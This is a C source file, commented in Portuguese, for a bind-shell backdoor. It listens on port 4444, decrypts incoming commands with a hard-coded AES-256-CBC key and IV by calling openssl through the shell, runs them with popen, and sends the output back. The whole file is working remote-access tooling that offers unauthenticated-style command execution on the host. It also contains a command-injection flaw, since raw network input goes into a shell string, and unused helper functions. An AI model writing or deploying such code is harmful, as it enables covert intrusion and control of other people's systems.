#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#include <cjson/cJSON.h>  // lib cJSON

#define PORT 4444



// Função para decodificar base64
unsigned char *base64_decode(const char *input, int *len) {
    BIO *b64, *bmem;
    int input_len = strlen(input);
    unsigned char *buffer = malloc(input_len);
    memset(buffer, 0, input_len);

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new_mem_buf((void *)input, input_len);
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    *len = BIO_read(bmem, buffer, input_len);
    BIO_free_all(bmem);

    return buffer;
}




// Executa o comando recebido e envia de volta a saída
void execute_command(const char *cmd, int client_sock) {
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        char *err = "Erro ao executar comando\n";
        send(client_sock, err, strlen(err), 0);
        return;
    }

    char output[1024];
    while (fgets(output, sizeof(output), fp) != NULL) {
        send(client_sock, output, strlen(output), 0);
    }

    pclose(fp);
}



// Chave e IV fixos em hexadecimal (AES-256-CBC)
#define KEY_HEX "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
#define IV_HEX  "0102030405060708090a0b0c0d0e0f10"

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[2048];
    char command[4096];
    char output[2048];
    FILE *fp;

    // Criação do socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Erro ao criar socket");
        exit(1);
    }

    // Configura o endereço do servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Faz o bind
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erro no bind");
        close(server_sock);
        exit(1);
    }

    // Escuta conexões
    listen(server_sock, 1);
    printf("Servidor escutando na porta %d...\n", PORT);

    // Aceita conexão
    client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
    if (client_sock < 0) {
        perror("Erro no accept");
        close(server_sock);
        exit(1);
    }

    printf("Conexão recebida de %s\n", inet_ntoa(client_addr.sin_addr));

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) break;

        buffer[n] = '\0';

        // Comando openssl para decifrar
        snprintf(command, sizeof(command),
            "echo '%s' | openssl enc -aes-256-cbc -a -d -K %s -iv %s 2>/dev/null",
            buffer, KEY_HEX, IV_HEX);

        // Executa a decifragem
        fp = popen(command, "r");
        if (!fp) {
            char *msg = "Erro ao decifrar comando\n";
            send(client_sock, msg, strlen(msg), 0);
            continue;
        }

        // Lê o comando decifrado
        char decrypted[1024];
        if (fgets(decrypted, sizeof(decrypted), fp) == NULL) {
            char *msg = "Falha na leitura do comando\n";
            send(client_sock, msg, strlen(msg), 0);
            pclose(fp);
            continue;
        }
        decrypted[strcspn(decrypted, "\n")] = 0; // Remove newline
        pclose(fp);

        // Executa o comando real
        fp = popen(decrypted, "r");
        if (!fp) {
            char *msg = "Erro ao executar comando\n";
            send(client_sock, msg, strlen(msg), 0);
            continue;
        }

        // Envia saída do comando
        while (fgets(output, sizeof(output), fp)) {
            send(client_sock, output, strlen(output), 0);
        }

        pclose(fp);
    }

    close(client_sock);
    close(server_sock);
    return 0;
}
